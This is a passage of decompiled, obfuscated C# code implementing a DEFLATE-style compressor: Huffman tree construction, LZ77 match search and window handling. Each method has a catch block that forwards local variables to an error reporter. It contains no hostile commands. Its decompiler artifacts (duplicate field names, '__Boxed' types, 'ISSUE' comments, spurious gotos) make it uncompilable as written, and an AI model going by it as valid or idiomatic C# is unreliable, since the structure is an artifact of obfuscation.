            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) num2;
            int[] o6 = numArray2;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> o7 = (ValueType) index3;
            \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this);
            throw;
          }
        }

        private void \u0002(int[] childs)
        {
          int length;
          int index1;
          int[] numArray1;
          int index2;
          int num1;
          int num2;
          int num3;
          int num4;
          int[] numArray2;
          IntPtr index3;
          int num5;
          int num6;
          int num7;
          int num8;
          int num9;
          int index4;
          try
          {
            this.\u0001 = new byte[(int) checked ((uint) this.\u0001.Length)];
            int num10 = childs.Length / 2;
            if (true)
              goto label_39;
label_1:
            int num11 = (length + 1) / 2;
            if (true)
              goto label_40;
label_2:
            if (true)
              goto label_41;
label_3:
            if (true)
              goto label_42;
label_7:
            int num12;
            int num13;
            while (index1 < this.\u0003)
            {
              this.\u0001[index1] = 0;
              if (true)
              {
                int num14 = index1;
                int num15 = 1;
                if (num15 != 0)
                {
                  int num16 = num14 + num15;
                  if (true)
                    index1 = num16;
                }
                else
                {
                  num13 = num15;
                  num12 = num14;
                  goto label_32;
                }
              }
              else
                goto label_15;
            }
            int[] numArray3 = new int[(int) checked ((uint) length)];
            if (true)
              goto label_44;
label_9:
            numArray1[length - 1] = 0;
            num12 = length;
            goto label_10;
label_44:
            numArray1 = numArray3;
            goto label_9;
label_10:
            index2 = num12 - 1;
            goto label_20;
label_13:
            int num17;
            int num18;
            if (num17 > num18)
              num1 = this.\u0003;
            else
              goto label_16;
label_15:
            ++num2;
label_16:
            int[] numArray4 = numArray1;
            int child = childs[2 * index2];
            numArray1[childs[2 * index2 + 1]] = num3 = num1;
            int num19 = num3;
            numArray4[child] = num19;
label_18:
            int num20 = index2;
            if (true)
              index2 = num20 - 1;
            else
              goto label_28;
label_20:
            if (index2 >= 0)
            {
              if (childs[2 * index2 + 1] != -1)
              {
                num1 = numArray1[index2] + 1;
                num17 = num1;
                num18 = this.\u0003;
                goto label_13;
              }
              else
              {
                num4 = numArray1[index2];
                (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (num4 - 1))] = numArray2[index3] + 1;
                this.\u0001[childs[2 * index2]] = (byte) numArray1[index2];
                goto label_18;
              }
            }
            else
            {
              if (num2 == 0)
                return;
              num5 = this.\u0003 - 1;
              do
              {
                do
                  ;
                while (this.\u0001[--num5] == 0);
                do
                {
                  (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) num5)] = numArray2[index3] - 1;
                  int[] numArray5;
                  numArray2 = numArray5 = this.\u0001;
                  int index5;
                  num5 = index5 = num5 + 1;
                  index3 = (IntPtr) index5;
                  int num21 = numArray2[index3] + 1;
                  numArray5[index5] = num21;
                  num2 -= 1 << this.\u0003 - 1 - num5;
                }
                while (num2 > 0 && num5 < this.\u0003 - 1);
              }
              while (num2 > 0);
              (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 1))] = numArray2[index3] + num2;
              (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 2))] = numArray2[index3] - num2;
              num20 = 2;
            }
label_28:
            int num22 = num6;
            num7 = num20 * num22;
            num8 = this.\u0003;
            goto label_37;
label_32:
            if (num13 == 0)
            {
              int num23 = 1;
              if (num23 == 0)
              {
                num18 = num23;
                num17 = num12;
                goto label_13;
              }
              else
                num9 = num12 - num23;
            }
            else
              goto label_10;
label_35:
            while (num9 > 0)
            {
              index4 = 2 * childs[num7++];
              if (childs[index4 + 1] == -1)
              {
                this.\u0001[childs[index4]] = (byte) num8;
                num12 = num9;
                num13 = 0;
                goto label_32;
              }
            }
            --num8;
label_37:
            if (num8 == 0)
              return;
            num9 = this.\u0001[num8 - 1];
            goto label_35;
label_42:
            index1 = 0;
            goto label_7;
label_41:
            num2 = 0;
            goto label_3;
label_40:
            num6 = num11;
            goto label_2;
label_39:
            length = num10;
            goto label_1;
          }
          catch (Exception ex)
          {
            object[] objects = new object[18]
            {
              (object) length,
              (object) num6,
              (object) num2,
              (object) index1,
              (object) numArray1,
              (object) index2,
              (object) num1,
              (object) num4,
              (object) num5,
              (object) num7,
              (object) num8,
              (object) num9,
              (object) index4,
              (object) num3,
              (object) numArray2,
              (object) index3,
              (object) this,
              (object) childs
            };
            \u0004.\u0002(ex, objects);
            throw;
          }
        }

        public void \u0003()
        {
          int length1;
          int index1;
          int num1;
          int num2;
          int index2;
          int[] numArray1;
          int index3;
          int num3;
          int num4;
          int num5;
          int[] childs;
          int[] numArray2;
          int num6;
          int index4;
          int index5;
          int index6;
          int index7;
          int index8;
          int index9;
          int num7;
          int index10;
          int num8;
          try
          {
            int length2 = this.\u0001.Length;
            if (true)
              goto label_50;
label_1:
            int[] numArray3 = new int[(int) checked ((uint) length1)];
            if (true)
              goto label_51;
label_2:
            if (true)
              goto label_52;
label_3:
            if (true)
              goto label_53;
label_4:
            if (true)
              goto label_54;
label_12:
            while (true)
            {
              int num9 = index1;
              while (true)
              {
                int num10 = length1;
                if (num9 >= num10)
                {
                  for (; num2 < 2; numArray1[num2++] = num4)
                  {
                    int num11;
                    if (num3 >= 2)
                      num11 = 0;
                    else
                      num3 = num11 = num3 + 1;
                    num4 = num11;
                  }
                  this.\u0002 = Math.Max(num3 + 1, this.\u0001);
                  num5 = num2;
                  childs = new int[(int) checked ((uint) unchecked (4 * num2 - 2))];
                  numArray2 = new int[(int) checked ((uint) unchecked (2 * num2 - 1))];
                  num6 = num5;
                  for (index4 = 0; index4 < num2; ++index4)
                  {
                    index5 = numArray1[index4];
                    childs[2 * index4] = index5;
                    childs[2 * index4 + 1] = -1;
                    numArray2[index4] = (int) this.\u0001[index5] << 8;
                    numArray1[index4] = index4;
                  }
                  int num12;
                  int num13;
                  do
                  {
                    index6 = numArray1[0];
                    index7 = numArray1[--num2];
                    index8 = 0;
                    index9 = 1;
                    int num14;
                    int num15;
                    while (true)
                    {
                      if (index9 < num2)
                      {
                        if (index9 + 1 < num2 && numArray2[numArray1[index9]] > numArray2[numArray1[index9 + 1]])
                        {
                          int num16 = index9;
                          num14 = num15 = 1;
                          num14 = num16;
                        }
                        else
                          goto label_27;
                      }
                      else
                        goto label_30;
label_25:
                      if (num15 != 0)
                        index9 = num14 + num14;
                      else
                        goto label_37;
label_27:
                      numArray1[index8] = numArray1[index9];
                      index8 = index9;
                      int num17 = index9 * 2 + 1;
                      if (true)
                      {
                        index9 = num17;
                        continue;
                      }
                      goto label_35;
label_30:
                      num7 = numArray2[index7];
label_32:
                      if ((index9 = index8) > 0)
                      {
                        if (true)
                          num17 = numArray2[numArray1[index8 = (index9 - 1) / 2]];
                        else
                          goto label_5;
                      }
                      else
                        goto label_36;
label_35:
                      int num18 = num7;
                      if (num17 > num18)
                      {
                        numArray1[index9] = numArray1[index8];
                        goto label_32;
                      }
label_36:
                      numArray1[index9] = index7;
                      index10 = numArray1[0];
                      num14 = num6;
label_37:
                      num15 = 1;
                      if (num15 == 0)
                        goto label_25;
                      else
                        break;
                    }
                    num6 = num14 + num15;
                    index7 = num14;
                    childs[2 * index7] = index6;
                    childs[2 * index7 + 1] = index10;
                    num8 = Math.Min(numArray2[index6] & (int) byte.MaxValue, numArray2[index10] & (int) byte.MaxValue);
                    numArray2[index7] = num7 = numArray2[index6] + numArray2[index10] - num8 + 1;
                    index8 = 0;
                    index9 = 1;
                    while (true)
                    {
                      int num19;
                      if (index9 < num2)
                      {
                        if (index9 + 1 < num2 && numArray2[numArray1[index9]] > numArray2[numArray1[index9 + 1]])
                          ++index9;
                        numArray1[index8] = numArray1[index9];
                        num12 = index9;
                        if (true)
                        {
                          index8 = num12;
                          num19 = index8 * 2 + 1;
                        }
                        else
                          goto label_57;
                      }
                      else
                        goto label_46;
label_43:
                      index9 = num19;
                      continue;
label_46:
                      while ((index9 = index8) > 0 && numArray2[numArray1[index8 = (index9 - 1) / 2]] > num7)
                        numArray1[index9] = numArray1[index8];
                      numArray1[index9] = index7;
                      num13 = num2;
                      if (false)
                      {
                        num19 = num13;
                        goto label_43;
                      }
                      else
                        break;
                    }
                  }
                  while (num13 > 1);
                  goto label_49;
label_57:
                  num9 = num12;
                }
                else
                  break;
              }
label_5:
              int num20 = (int) this.\u0001[index1];
              if (true)
                goto label_55;
label_6:
              if (num1 != 0)
              {
                for (index2 = num2++; index2 > 0 && (int) this.\u0001[numArray1[index3 = (index2 - 1) / 2]] > num1; index2 = index3)
                  numArray1[index2] = numArray1[index3];
                numArray1[index2] = index1;
                num3 = index1;
              }
              ++index1;
              continue;
label_55:
              num1 = num20;
              goto label_6;
            }
label_49:
            this.\u0002(childs);
            return;
label_54:
            index1 = 0;
            goto label_12;
label_53:
            num3 = 0;
            goto label_4;
label_52:
            num2 = 0;
            goto label_3;
label_51:
            numArray1 = numArray3;
            goto label_2;
label_50:
            length1 = length2;
            goto label_1;
          }
          catch (Exception ex)
          {
            object[] objects = new object[23]
            {
              (object) length1,
              (object) numArray1,
              (object) num2,
              (object) num3,
              (object) index1,
              (object) num1,
              (object) index2,
              (object) index3,
              (object) num4,
              (object) num5,
              (object) childs,
              (object) numArray2,
              (object) num6,
              (object) index4,
              (object) index5,
              (object) index6,
              (object) index7,
              (object) index8,
              (object) index9,
              (object) num7,
              (object) index10,
              (object) num8,
              (object) this
            };
            \u0004.\u0002(ex, objects);
            throw;
          }
        }

        public int \u0002()
        {
          int num1;
          int index;
          try
          {
            int num2 = 0;
            while (true)
            {
              if (num2 == 0)
              {
                if (true)
                  goto label_12;
label_3:
                if (true)
                {
                  index = 0;
                  goto label_7;
                }
                else
                  goto label_7;
label_12:
                num1 = num2;
                goto label_3;
              }
              else
                goto label_8;
label_7:
              num2 = index;
label_8:
              int num3 = this.\u0001.Length;
              if (true)
                goto label_9;
label_5:
              int num4 = num2 + num3;
              if (true)
                goto label_14;
label_6:
              int num5 = index + 1;
              if (true)
              {
                index = num5;
                goto label_7;
              }
              else
                goto label_7;
label_14:
              num1 = num4;
              goto label_6;
label_9:
              if (false)
                num2 = num3;
              else if (num2 < num3)
              {
                int num6 = num1;
                num3 = (int) this.\u0001[index] * (int) this.\u0001[index];
                num2 = num6;
                goto label_5;
              }
              else
                break;
            }
            return num1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) index;
            \u0004.\u0002(ex, (object) o1, (object) o2, (object) this);
            throw;
          }
        }

        public void \u0002(\u0004.\u0007.\u0001 blTree)
        {
label_0:
          int index1;
          int num1;
          int num2;
          int num3;
          int num4;
          short[] numArray;
          IntPtr index2;
          int num5;
          try
          {
            if (true)
              goto label_28;
label_1:
            if (true)
              goto label_29;
label_26:
            while (index1 < this.\u0002)
            {
              if (true)
                goto label_30;
label_3:
              int num6 = (int) this.\u0001[index1];
              if (true)
                goto label_31;
label_4:
              while (num1 != 0)
              {
                num2 = 6;
                num3 = 3;
                if (num4 != num1)
                {
                  (numArray = blTree.\u0001)[(int) (index2 = (IntPtr) num1)] = (short) ((int) numArray[index2] + 1);
                  if (true)
                  {
                    if (true)
                    {
                      num5 = 0;
                      goto label_11;
                    }
                    else
                      goto label_0;
                  }
                }
                else
                  goto label_11;
              }
              if (true)
                num2 = 138;
label_6:
              if (true)
                num3 = 3;
label_11:
              num4 = num1;
              ++index1;
label_14:
              int num7 = index1;
              int num8;
              int num9;
              while (true)
              {
                int num10 = this.\u0002;
                if (num7 < num10 && num4 == (int) this.\u0001[index1])
                {
                  ++index1;
                  num9 = num5 + 1;
                  if (true)
                  {
                    num5 = num9;
                    if (num9 < num2)
                      goto label_14;
                  }
                  else
                    goto label_36;
                }
                num8 = num5;
                if (false)
                  num7 = num8;
                else
                  break;
              }
              int num11 = num3;
              if (num8 < num11)
              {
                (numArray = blTree.\u0001)[(int) (index2 = (IntPtr) num4)] = (short) ((int) numArray[index2] + (int) (short) num5);
                continue;
              }
              if (num4 != 0)
              {
                (numArray = blTree.\u0001)[16] = (short) ((int) numArray[16] + 1);
                continue;
              }
              int num12 = num5;
              int num13 = 10;
              goto label_22;
label_36:
              num13 = num9;
              num12 = num9;
label_22:
              if (num12 <= num13)
              {
                if (true)
                {
                  (numArray = blTree.\u0001)[17] = (short) ((int) numArray[17] + 1);
                  continue;
                }
                goto label_6;
              }
              else
              {
                (numArray = blTree.\u0001)[18] = (short) ((int) numArray[18] + 1);
                continue;
              }
label_31:
              num1 = num6;
              goto label_4;
label_30:
              num5 = 1;
              goto label_3;
            }
            return;
label_29:
            index1 = 0;
            goto label_26;
label_28:
            num4 = -1;
            goto label_1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) num1;
            short[] o7 = numArray;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> o8 = (ValueType) index2;
            \u0004.\u0007.\u0001 o10 = blTree;
            \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) this, (object) o10);
            throw;
          }
        }

        public void \u0003(\u0004.\u0007.\u0001 blTree)
        {
          int index;
          int code1;
          int num1;
          int num2;
          int code2;
          int num3;
          try
          {
            if (true)
              goto label_31;
label_1:
            if (true)
              goto label_32;
label_29:
            while (index < this.\u0002)
            {
              if (true)
                goto label_33;
label_3:
              int num4 = (int) this.\u0001[index];
              if (true)
                goto label_34;
label_4:
              int num5;
              int num6;
              if (code1 == 0)
              {
                if (true)
                  goto label_35;
label_6:
                int num7 = 3;
                if (num7 != 0)
                {
                  if (true)
                  {
                    if (true)
                    {
                      num2 = num7;
                      goto label_11;
                    }
                    else
                      goto label_11;
                  }
                  else
                  {
                    num5 = num7;
                    goto label_21;
                  }
                }
                else
                {
                  num6 = num7;
                  goto label_17;
                }
label_35:
                num1 = 138;
                goto label_6;
              }
              else
              {
                num1 = 6;
                num2 = 3;
                if (code2 != code1)
                {
                  blTree.\u0002(code1);
                  num3 = 0;
                }
              }
label_11:
              code2 = code1;
              int num8 = index + 1;
label_12:
              index = num8;
label_15:
              if (index < this.\u0002)
                num6 = code2;
              else
                goto label_18;
label_17:
              int num9 = (int) this.\u0001[index];
              if (num6 == num9)
              {
                ++index;
                int num10 = num3;
                if (false)
                {
                  num8 = num10;
                  goto label_12;
                }
                else if ((num3 = num10 + 1) < num1)
                  goto label_15;
              }
label_18:
              if (num3 >= num2)
              {
                if (code2 == 0)
                  goto label_25;
label_24:
                blTree.\u0002(16);
                this.\u0001.\u0001.\u0002(num3 - 3, 2);
                continue;
label_25:
                if (num3 <= 10)
                {
                  blTree.\u0002(17);
                  this.\u0001.\u0001.\u0002(num3 - 3, 3);
                  continue;
                }
                blTree.\u0002(18);
                if (true)
                {
                  this.\u0001.\u0001.\u0002(num3 - 11, 7);
                  continue;
                }
                goto label_24;
              }
label_20:
              num5 = 0;
label_21:
              if (num5 == 0)
              {
                if (num3-- > 0)
                {
                  blTree.\u0002(code2);
                  goto label_20;
                }
                else
                  continue;
              }
              else
                goto label_11;
label_34:
              code1 = num4;
              goto label_4;
label_33:
              num3 = 1;
              goto label_3;
            }
            return;
label_32:
            index = 0;
            goto label_29;
label_31:
            code2 = -1;
            goto label_1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) code2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) code1;
            \u0004.\u0007.\u0001 o8 = blTree;
            \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
            throw;
          }
        }
      }
    }

    internal sealed class \u0008
    {
      private const int \u0001 = 258;
      private const int \u0002 = 3;
      private const int \u0003 = 32768;
      private const int \u0004 = 32767;
      private const int \u0005 = 32768;
      private const int \u0006 = 32767;
      private const int \u0007 = 5;
      private const int \u0008 = 262;
      private const int \u000E = 32506;
      private const int \u000F = 4096;
      private int \u0010;
      private short[] \u0001;
      private short[] \u0002;
      private int \u0011;
      private int \u0012;
      private bool \u0001;
      private int \u0013;
      private int \u0014;
      private int \u0015;
      private byte[] \u0001;
      private byte[] \u0002;
      private int \u0016;
      private int \u0017;
      private int \u0018;
      private \u0004.\u000E \u0001;
      private \u0004.\u0007 \u0001;

      public \u0008(\u0004.\u000E pending)
      {
        int num;
        try
        {
          this.\u0001 = pending;
          this.\u0001 = new \u0004.\u0007(pending);
          this.\u0001 = new byte[65536];
          this.\u0001 = new short[32768];
          this.\u0002 = new short[32768];
          this.\u0014 = num = 1;
          this.\u0013 = num;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          \u0004.\u000E o3 = pending;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      private void \u0002()
      {
        try
        {
          this.\u0010 = (int) this.\u0001[this.\u0014] << 5 ^ (int) this.\u0001[this.\u0014 + 1];
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      private int \u0002()
      {
        int index1;
        short num1;
        try
        {
          int num2;
          int maxValue;
          do
          {
            num2 = this.\u0010 << 5;
            maxValue = (int) this.\u0001[this.\u0014 + 2];
            if (true)
            {
              int num3 = (num2 ^ maxValue) & (int) short.MaxValue;
              if (true)
                goto label_6;
label_2:
              short[] numArray = this.\u0002;
              int index2 = this.\u0014 & (int) short.MaxValue;
              int num4 = (int) this.\u0001[index1];
              if (true)
                goto label_7;
label_3:
              numArray[index2] = (short) num4;
              continue;
label_7:
              num1 = (short) num4;
              goto label_3;
label_6:
              index1 = num3;
              goto label_2;
            }
            else
              goto label_5;
          }
          while (false);
          this.\u0001[index1] = (short) this.\u0014;
          this.\u0010 = index1;
          int num5 = (int) num1;
          maxValue = (int) ushort.MaxValue;
          num2 = num5;
label_5:
          return num2 & maxValue;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<short> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) index1;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      private void \u0003()
      {
        int index1;
        int num1;
        int index2;
        int num2;
        try
        {
          Array.Copy((Array) this.\u0001, 32768, (Array) this.\u0001, 0, 32768);
          int num3;
          if (true)
          {
            this.\u0011 -= 32768;
            this.\u0014 -= 32768;
            this.\u0013 -= 32768;
            if (true)
              goto label_13;
label_6:
            while (index1 < 32768)
            {
              if (true)
              {
                int num4 = (int) this.\u0001[index1] & (int) ushort.MaxValue;
                if (true)
                  num1 = num4;
              }
              this.\u0001[index1] = num1 >= 32768 ? (short) (num1 - 32768) : (short) 0;
              int num5 = index1;
              if (true)
              {
                int num6 = num5 + 1;
                if (true)
                  index1 = num6;
              }
              else
              {
                num3 = num5;
                goto label_11;
              }
            }
            if (true)
            {
              index2 = 0;
              goto label_10;
            }
            else
              goto label_10;
label_13:
            index1 = 0;
            goto label_6;
          }
label_9:
          this.\u0002[index2] = num2 >= 32768 ? (short) (num2 - 32768) : (short) 0;
          ++index2;
label_10:
          num3 = index2;
label_11:
          if (num3 >= 32768)
            return;
          int num7 = (int) this.\u0002[index2] & (int) ushort.MaxValue;
          if (true)
          {
            num2 = num7;
            goto label_9;
          }
          else
            goto label_9;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) index2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num2;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      public void \u0004()
      {
        int length;
        try
        {
          if (this.\u0014 >= 65274)
            this.\u0003();
          while (true)
          {
            if (this.\u0015 >= 262)
              goto label_14;
label_13:
            if (this.\u0017 < this.\u0018)
            {
              int num1;
              for (int index = 2; index != 0; index = num1)
              {
                int num2 = 65536 - this.\u0015 - this.\u0014;
                if (true)
                {
                  if (true)
                    goto label_18;
label_6:
                  num1 = length;
                  if (false)
                    continue;
                  int num3 = this.\u0018 - this.\u0017;
                  if (num1 > num3)
                  {
                    num2 = this.\u0018 - this.\u0017;
                    goto label_9;
                  }
                  else
                    goto label_10;
label_18:
                  length = num2;
                  goto label_6;
                }
label_9:
                if (true)
                  length = num2;
label_10:
                Array.Copy((Array) this.\u0002, this.\u0017, (Array) this.\u0001, this.\u0014 + this.\u0015, length);
                this.\u0017 += length;
                break;
              }
              this.\u0016 += length;
              this.\u0015 += length;
              continue;
            }
label_14:
            if (false)
              goto label_13;
            else
              break;
          }
          if (this.\u0015 < 3)
            return;
          this.\u0002();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) length;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      private bool \u0002(int curMatch)
      {
        int num1;
        int num2;
        int index1;
        byte num3;
        byte num4;
        int val1;
        int num5;
        int num6;
        int index2;
        int num7;
        short[] numArray1;
        try
        {
          if (true)
            goto label_21;
label_1:
          if (true)
            goto label_22;
label_2:
          short[] numArray2 = this.\u0002;
          if (true)
            goto label_23;
label_3:
          int num8 = this.\u0014;
          if (true)
            goto label_24;
label_4:
          int num9 = this.\u0014 + this.\u0012;
          if (true)
            goto label_25;
label_5:
          int num10 = Math.Max(this.\u0012, 2);
          if (true)
            goto label_26;
label_6:
          num1 = Math.Max(this.\u0014 - 32506, 0);
          num2 = this.\u0014 + 258 - 1;
          num3 = this.\u0001[index1 - 1];
          num4 = this.\u0001[index1];
          int num11 = val1;
          if (true)
          {
            if (num11 >= 8)
              num5 >>= 2;
            if (num6 > this.\u0015)
              num6 = this.\u0015;
          }
          else
            goto label_13;
label_11:
          if ((int) this.\u0001[curMatch + val1] == (int) num4 && (int) this.\u0001[curMatch + val1 - 1] == (int) num3 && (int) this.\u0001[curMatch] == (int) this.\u0001[index2] && (int) this.\u0001[curMatch + 1] == (int) this.\u0001[index2 + 1])
          {
            num7 = curMatch + 2;
            num11 = index2;
          }
          else
            goto label_19;
label_13:
          index2 = num11 + 2;
          do
            ;
          while ((int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && index2 < num2);
          if (index2 > index1)
          {
            this.\u0011 = curMatch;
            index1 = index2;
            val1 = index2 - this.\u0014;
            if (val1 < num6)
            {
              num3 = this.\u0001[index1 - 1];
              num4 = this.\u0001[index1];
            }
            else
              goto label_20;
          }
          index2 = this.\u0014;
label_19:
          if ((curMatch = (int) numArray1[curMatch & (int) short.MaxValue] & (int) ushort.MaxValue) > num1 && --num5 != 0)
            goto label_11;
label_20:
          this.\u0012 = Math.Min(val1, this.\u0015);
          return this.\u0012 >= 3;
label_26:
          val1 = num10;
          goto label_6;
label_25:
          index1 = num9;
          goto label_5;
label_24:
          index2 = num8;
          goto label_4;
label_23:
          numArray1 = numArray2;
          goto label_3;
label_22:
          num6 = 128;
          goto label_2;
label_21:
          num5 = 128;
          goto label_1;
        }
        catch (Exception ex)
        {
          object[] objects = new object[13]
          {
            (object) num5,
            (object) num6,
            (object) numArray1,
            (object) index2,
            (object) num7,
            (object) index1,
            (object) val1,
            (object) num1,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) this,
            (object) curMatch
          };
          \u0004.\u0002(ex, objects);
          throw;
        }
      }

      private bool \u0002(bool flush, bool finish)
      {
        int curMatch;
        int len;
        int num1;
        int storedLength;
        bool lastBlock;
        try
        {
          if (this.\u0015 < 262 && !flush)
            return false;
          int num2;
          do
          {
            int num3 = this.\u0015;
            int num4 = 262;
            int num5;
            int num6;
            while (true)
            {
              if (num3 < num4)
                goto label_39;
label_2:
              if (this.\u0015 != 0)
              {
                num2 = this.\u0014;
                if (true)
                {
                  if (true)
                  {
                    if (num2 >= 65274)
                      this.\u0003();
                    int num7 = this.\u0011;
                    if (true)
                      goto label_42;
label_11:
                    int num8 = this.\u0012;
                    if (true)
                      goto label_43;
label_12:
                    if (this.\u0015 >= 3)
                    {
                      int num9 = this.\u0002();
                      if (true)
                        goto label_44;
label_14:
                      if (curMatch != 0 && this.\u0014 - curMatch <= 32506 && this.\u0002(curMatch) && this.\u0012 <= 5)
                      {
                        num5 = this.\u0012;
                        num6 = 3;
                        if (num6 == 0)
                        {
                          num4 = num6;
                          num3 = num5;
                          continue;
                        }
                        break;
                      }
                      goto label_19;
label_44:
                      curMatch = num9;
                      goto label_14;
                    }
                    else
                      goto label_19;
label_43:
                    len = num8;
                    goto label_12;
label_42:
                    num1 = num7;
                    goto label_11;
                  }
                  else
                    goto label_35;
                }
                else
                  goto label_40;
              }
              else
                goto label_3;
label_39:
              num2 = flush ? 1 : 0;
label_40:
              if (num2 != 0)
                goto label_2;
              else
                goto label_41;
            }
            if (num5 == num6 && this.\u0014 - this.\u0011 > 4096)
            {
              if (true)
                this.\u0012 = 2;
              else
                goto label_29;
            }
label_19:
            if (len >= 3 && this.\u0012 <= len)
            {
              this.\u0001.\u0002(this.\u0014 - 1 - num1, len);
              int num10 = len - 2;
              if (true)
                goto label_45;
label_21:
              int num11;
              do
              {
                ++this.\u0014;
                --this.\u0015;
                if (this.\u0015 >= 3)
                  this.\u0002();
                num11 = len - 1;
                if (true)
                  goto label_46;
label_24:
                continue;
label_46:
                len = num11;
                goto label_24;
              }
              while (num11 > 0);
              ++this.\u0014;
              --this.\u0015;
              this.\u0001 = false;
              this.\u0012 = 2;
              goto label_29;
label_45:
              len = num10;
              goto label_21;
            }
            else
            {
              if (this.\u0001)
                this.\u0001.\u0002((int) this.\u0001[this.\u0014 - 1] & (int) byte.MaxValue);
              this.\u0001 = true;
              ++this.\u0014;
              --this.\u0015;
            }
label_29:;
          }
          while (!this.\u0001.\u0002());
          goto label_30;
label_3:
          if (this.\u0001)
            this.\u0001.\u0002((int) this.\u0001[this.\u0014 - 1] & (int) byte.MaxValue);
          this.\u0001 = false;
          this.\u0001.\u0003(this.\u0001, this.\u0013, this.\u0014 - this.\u0013, finish);
          this.\u0013 = this.\u0014;
          return false;
label_30:
          int num12 = this.\u0014;
          int num13 = this.\u0013;
          int num14;
          if (true)
          {
            int num15 = num12 - num13;
            if (true)
              goto label_47;
label_32:
            if (this.\u0001)
              --storedLength;
            lastBlock = finish && this.\u0015 == 0 && !this.\u0001;
            this.\u0001.\u0003(this.\u0001, this.\u0013, storedLength, lastBlock);
            this.\u0013 += storedLength;
            num2 = lastBlock ? 1 : 0;
            goto label_35;
label_47:
            storedLength = num15;
            goto label_32;
          }
          else
          {
            num14 = num13;
            num2 = num12;
            goto label_36;
          }
label_35:
          num14 = 0;
label_36:
          return num2 == num14;
label_41:
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) len;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) curMatch;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) storedLength;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o5 = (ValueType) lastBlock;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o7 = (ValueType) flush;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o8 = (ValueType) finish;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8);
          throw;
        }
      }

      public bool \u0003(bool flush, bool finish)
      {
        bool flush1;
        bool flag;
        try
        {
          int num1;
          do
          {
            this.\u0004();
            int num2 = flush ? 1 : 0;
            if (false)
              goto label_3;
label_1:
            int num3;
            if (num2 != 0)
            {
              num2 = this.\u0017 == this.\u0018 ? 1 : 0;
            }
            else
            {
              num3 = 0;
              goto label_5;
            }
label_3:
            if (true)
              num3 = num2;
            else
              goto label_1;
label_5:
            while (true)
            {
              if (true)
                goto label_11;
label_6:
              int num4 = this.\u0002(flush1, finish) ? 1 : 0;
              if (true)
                goto label_12;
label_7:
              if (this.\u0001.IsFlushed)
              {
                num1 = flag ? 1 : 0;
                if (false)
                {
                  num3 = num1;
                  continue;
                }
                break;
              }
              goto label_10;
label_12:
              flag = num4 != 0;
              goto label_7;
label_11:
              flush1 = num3 != 0;
              goto label_6;
            }
          }
          while (num1 != 0);
label_10:
          return flag;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
